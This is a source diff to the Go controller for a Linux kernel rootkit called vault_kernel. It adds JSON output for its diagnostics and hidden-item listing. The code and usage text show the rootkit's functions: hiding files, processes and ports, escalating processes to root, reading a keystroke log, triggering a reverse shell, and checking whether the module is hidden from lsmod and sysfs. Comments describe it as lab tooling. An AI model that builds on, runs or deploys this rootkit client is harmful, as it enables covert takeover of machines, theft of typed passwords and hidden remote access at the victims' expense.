@@ -13,7 +13,7 @@ import (
 	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
 )
 
-const clientVersion = "3.5"
+const clientVersion = "3.6"
 
 const devicePath = "/dev/vault_kernel"
 
@@ -175,6 +175,24 @@ func listHidden(f *os.File) error {
 	return nil
 }
 
+// listHiddenJSON emits the LIST_HIDDEN report as JSON for lab scripts:
+// {"pids": [...], "files": [...], "ports": [...]}.  Empty sections
+// marshal as [] (the parser returns non-nil slices).
+func listHiddenJSON(f *os.File) error {
+	buf := make([]byte, 4096)
+	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&buf[0])); err != 0 {
+		return err
+	}
+	output := strings.TrimRight(string(buf), "\x00")
+	hl := ioctl.ParseHiddenList(output)
+	j, err := json.MarshalIndent(hl, "", "  ")
+	if err != nil {
+		return err
+	}
+	fmt.Println(string(j))
+	return nil
+}
+
 func keylogRead(f *os.File) error {
 	buf := make([]byte, 4096)
 	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&buf[0]))
@@ -301,18 +319,15 @@ func showStats(f *os.File) error {
 // showStatsJSON re-emits the GET_STATS key=value report as JSON so
 // lab scripts can consume it without text munging. Numeric values
 // are converted to JSON numbers, the rest stay strings.
+// v3.6: parsing goes through the shared token-based ParseStatsReport —
+// the previous line-based split lost every pair after the first on
+// each line (version, hooks_planned, hidden_pids, hidden_ports).
 func showStatsJSON(f *os.File) error {
 	buf := make([]byte, 4096)
 	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0])); err != 0 {
 		return err
 	}
-	raw := map[string]string{}
-	for _, line := range strings.Split(strings.TrimRight(string(buf), "\x00"), "\n") {
-		line = strings.TrimSpace(line)
-		if i := strings.Index(line, "="); i > 0 {
-			raw[line[:i]] = line[i+1:]
-		}
-	}
+	raw := ioctl.ParseStatsReport(strings.TrimRight(string(buf), "\x00"))
 	if len(raw) == 0 {
 		return fmt.Errorf("module returned an empty stats report")
 	}
@@ -347,97 +362,180 @@ func magicEncode(word string, port uint16) error {
 	return nil
 }
 
+// doctorReport is the machine-readable form of runDoctor. Pointer
+// fields are omitted from the JSON when the corresponding check could
+// not run (module unreachable, version not reported, ...).
+type doctorReport struct {
+	ClientVersion  string `json:"client_version"`
+	DevicePresent  bool   `json:"device_present"`
+	DeviceOpen     bool   `json:"device_open,omitempty"`
+	StatsResponds  bool   `json:"stats_responds,omitempty"`
+	ModuleVersion  string `json:"module_version,omitempty"`
+	VersionMatch   *bool  `json:"version_match,omitempty"`
+	UptimeS        *int64 `json:"uptime_s,omitempty"`
+	HooksInstalled *int   `json:"hooks_installed,omitempty"`
+	HooksPlanned   *int   `json:"hooks_planned,omitempty"`
+	ModuleInSysfs  *bool  `json:"module_in_sysfs,omitempty"`
+	KeylogResponds *bool  `json:"keylog_responds,omitempty"`
+	ListResponds   *bool  `json:"list_responds,omitempty"`
+	Warnings       int    `json:"warnings"`
+}
+
+func renderDoctorJSON(rep *doctorReport) {
+	j, err := json.MarshalIndent(rep, "", "  ")
+	if err != nil {
+		fmt.Println("{}")
+		return
+	}
+	fmt.Println(string(j))
+}
+
 // runDoctor performs lab sanity checks against a loaded module: device
 // node, permissions, stats ABI, hook count, client/module version match,
 // module stealth state and every read-only control interface. It exits
 // non-zero only when the module is unreachable; warnings do not fail.
-func runDoctor() error {
-	fmt.Println("[*] vault_kernel doctor — lab diagnostics")
-	fmt.Println()
+// With jsonMode it prints a single JSON document instead of text, so
+// lab scripts can consume it with jq.
+func runDoctor(jsonMode bool) error {
+	rep := doctorReport{ClientVersion: clientVersion}
+	say := func(format string, a ...interface{}) {
+		if !jsonMode {
+			fmt.Printf(format, a...)
+		}
+	}
+	fail := func(err error) error {
+		// Failure states still emit the JSON document (with
+		// the checks that ran); text mode keeps the original
+		// behavior of stopping without the trailer.
+		if jsonMode {
+			renderDoctorJSON(&rep)
+		}
+		return err
+	}
 
-	warnings := 0
+	say("[*] vault_kernel doctor — lab diagnostics\n")
+	say("\n")
 
 	// 1. Device node present?
 	st, err := os.Stat(devicePath)
 	if err != nil {
-		fmt.Printf("  [FAIL] %s not found — module is not loaded\n", devicePath)
-		fmt.Println("         Load it first: sudo insmod vault_kernel.ko")
-		return fmt.Errorf("module not loaded")
+		say("  [FAIL] %s not found — module is not loaded\n", devicePath)
+		say("         Load it first: sudo insmod vault_kernel.ko\n")
+		return fail(fmt.Errorf("module not loaded"))
 	}
-	fmt.Printf("  [ OK ] device %s present (mode %s)\n", devicePath, st.Mode().String())
+	rep.DevicePresent = true
+	say("  [ OK ] device %s present (mode %s)\n", devicePath, st.Mode().String())
 
 	// 2. Device opens read/write?
 	f, err := os.OpenFile(devicePath, os.O_RDWR, 0)
 	if err != nil {
-		fmt.Printf("  [FAIL] cannot open %s: %v\n", devicePath, err)
-		fmt.Println("         EACCES/EPERM → run with sudo (module also rejects non-root since v3.4).")
-		return err
+		say("  [FAIL] cannot open %s: %v\n", devicePath, err)
+		say("         EACCES/EPERM → run with sudo (module also rejects non-root since v3.4).\n")
+		return fail(err)
 	}
 	defer f.Close()
-	fmt.Println("  [ OK ] device opens read/write")
+	rep.DeviceOpen = true
+	say("  [ OK ] device opens read/write\n")
 
 	// 3. GET_STATS responds?
 	buf := make([]byte, 4096)
 	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0])); err != 0 {
-		fmt.Printf("  [FAIL] GET_STATS failed: %v\n", err)
-		fmt.Println("         If this is ENOTTY, the client and module versions are out of sync.")
-		return err
+		say("  [FAIL] GET_STATS failed: %v\n", err)
+		say("         If this is ENOTTY, the client and module versions are out of sync.\n")
+		return fail(err)
 	}
-	stats := map[string]string{}
-	for _, line := range strings.Split(strings.TrimRight(string(buf), "\x00"), "\n") {
-		line = strings.TrimSpace(line)
-		if i := strings.Index(line, "="); i > 0 {
-			stats[line[:i]] = line[i+1:]
-		}
+	rep.StatsResponds = true
+	/* The stats report carries MULTIPLE key=value pairs per line —
+	 * parse it with the shared token-based parser (see
+	 * internal/vaultkernel/report.go for the v3.4/v3.5 bug this
+	 * replaces). */
+	stats := ioctl.ParseStatsReport(strings.TrimRight(string(buf), "\x00"))
+	say("  [ OK ] GET_STATS responds\n")
+	say("         module version : %s\n", stats["version"])
+	say("         uptime_s       : %s\n", stats["uptime_s"])
+	rep.ModuleVersion = stats["version"]
+	if n, err := strconv.ParseInt(stats["uptime_s"], 10, 64); err == nil {
+		rep.UptimeS = &n
 	}
-	fmt.Println("  [ OK ] GET_STATS responds")
-	fmt.Printf("         module version : %s\n", stats["version"])
-	fmt.Printf("         uptime_s       : %s\n", stats["uptime_s"])
 
 	// 4. Client/module version match
-	if v := stats["version"]; v != "" && v != clientVersion {
-		fmt.Printf("  [WARN] client v%s != module v%s — ioctl ABI may differ\n", clientVersion, v)
-		warnings++
+	if v := stats["version"]; v != "" {
+		match := v == clientVersion
+		rep.VersionMatch = &match
+		if !match {
+			say("  [WARN] client v%s != module v%s — ioctl ABI may differ\n", clientVersion, v)
+			rep.Warnings++
+		}
 	}
 
 	// 5. Hooks installed
-	if hooks := stats["hooks_installed"]; hooks != "" {
-		if hooks == "0" {
-			fmt.Println("  [WARN] 0 syscall hooks installed — hiding features are inactive")
-			warnings++
+	if h := stats["hooks_installed"]; h != "" {
+		n, err := strconv.Atoi(h)
+		if err != nil {
+			say("  [WARN] hooks_installed not numeric: %q\n", h)
+			rep.Warnings++
 		} else {
-			fmt.Printf("  [ OK ] %s/%s syscall hooks installed\n", hooks, stats["hooks_planned"])
+			rep.HooksInstalled = &n
+			if p, perr := strconv.Atoi(stats["hooks_planned"]); perr == nil {
+				rep.HooksPlanned = &p
+				say("  [ OK ] %d/%d syscall hooks installed\n", n, p)
+			} else {
+				say("  [ OK ] %d syscall hooks installed\n", n)
+			}
+			if n == 0 {
+				say("  [WARN] 0 syscall hooks installed — hiding features are inactive\n")
+				rep.Warnings++
+			}
 		}
 	}
 
 	// 6. Stealth state (informational, never a warning)
-	if _, err := os.Stat(sysfsModulePath); err != nil {
-		fmt.Println("  [INFO] module not in /sys/module — hidden from lsmod/sysfs")
-	} else {
-		fmt.Println("  [INFO] module visible in /sys/module — not hidden")
+	{
+		_, err := os.Stat(sysfsModulePath)
+		visible := err == nil
+		rep.ModuleInSysfs = &visible
+		if visible {
+			say("  [INFO] module visible in /sys/module — not hidden\n")
+		} else {
+			say("  [INFO] module not in /sys/module — hidden from lsmod/sysfs\n")
+		}
 	}
 
 	// 7. Keylog interface
 	kb := make([]byte, 4096)
-	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&kb[0])); err != 0 {
-		fmt.Printf("  [WARN] KEYLOG_READ failed: %v\n", err)
-		warnings++
-	} else {
-		fmt.Println("  [ OK ] keylog interface responds")
+	{
+		_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&kb[0]))
+		ok := err == 0
+		rep.KeylogResponds = &ok
+		if !ok {
+			say("  [WARN] KEYLOG_READ failed: %v\n", err)
+			rep.Warnings++
+		} else {
+			say("  [ OK ] keylog interface responds\n")
+		}
 	}
 
 	// 8. List interface
 	lb := make([]byte, 4096)
-	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&lb[0])); err != 0 {
-		fmt.Printf("  [WARN] LIST_HIDDEN failed: %v\n", err)
-		warnings++
-	} else {
-		fmt.Println("  [ OK ] list interface responds")
+	{
+		_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&lb[0]))
+		ok := err == 0
+		rep.ListResponds = &ok
+		if !ok {
+			say("  [WARN] LIST_HIDDEN failed: %v\n", err)
+			rep.Warnings++
+		} else {
+			say("  [ OK ] list interface responds\n")
+		}
 	}
 
+	if jsonMode {
+		renderDoctorJSON(&rep)
+		return nil
+	}
 	fmt.Println()
-	if warnings > 0 {
-		fmt.Printf("[*] doctor finished with %d warning(s)\n", warnings)
+	if rep.Warnings > 0 {
+		fmt.Printf("[*] doctor finished with %d warning(s)\n", rep.Warnings)
 	} else {
 		fmt.Println("[*] doctor finished: everything OK")
 	}
@@ -457,7 +555,7 @@ Usage:
 
 Commands:
   status                  Check if rootkit is loaded
-  doctor                  Diagnose module/client state (lab sanity check)
+  doctor [--json]         Diagnose module/client state (lab sanity check)
   give-root [pid]         Escalate process to root (default: self)
   hide-file <name>        Hide a file/directory
   unhide-file <name>      Reveal a hidden file/directory
@@ -465,7 +563,7 @@ Commands:
   unhide-pid <pid>        Reveal a hidden process
   hide-port <port>        Hide a TCP/UDP port from netstat, ss
   unhide-port <port>      Reveal a hidden port
-  list                    List all hidden items
+  list [--json]           List all hidden items
   stats                   Show module stats (version, hooks, counts)
   stats --json            Same, as machine-readable JSON
   shell <ip:port>         Trigger reverse shell
@@ -507,7 +605,7 @@ func run() error {
 	}
 
 	if os.Args[1] == "doctor" {
-		return runDoctor()
+		return runDoctor(len(os.Args) > 2 && os.Args[2] == "--json")
 	}
 
 	if os.Args[1] == "magic-encode" {
@@ -590,6 +688,9 @@ func run() error {
 		return unhidePort(f, uint16(p))
 
 	case "list":
+		if len(os.Args) > 2 && os.Args[2] == "--json" {
+			return listHiddenJSON(f)
+		}
 		return listHidden(f)
 
 	case "stats":
